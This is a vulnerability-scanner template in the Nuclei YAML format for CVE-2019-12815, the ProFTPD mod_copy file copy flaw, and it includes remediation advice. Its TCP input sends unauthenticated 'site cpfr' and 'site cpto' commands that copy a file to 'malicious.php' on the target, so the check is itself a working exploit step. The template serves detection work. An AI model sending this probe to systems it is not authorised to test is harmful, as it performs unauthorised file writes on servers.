id: CVE-2019-12815

info:
  name: ProFTPD mod_copy Arbitrary File Copy Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    An arbitrary file copy vulnerability in mod_copy in ProFTPD up to 1.3.5b allows for remote code execution and information disclosure without authentication.
  remediation: |
    Upgrade ProFTPD to version 1.3.6 or later. If an upgrade is not possible, disable the mod_copy module in the ProFTPD configuration to mitigate this vulnerability.

tcp:
  - inputs:
      - data: "site cpfr welcome.msg\r\nsite cpto malicious.php\r\n"
    host:
      - "{{Hostname}}"
    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "350 File or directory exists"
          - "250 Copy successful"
        part: data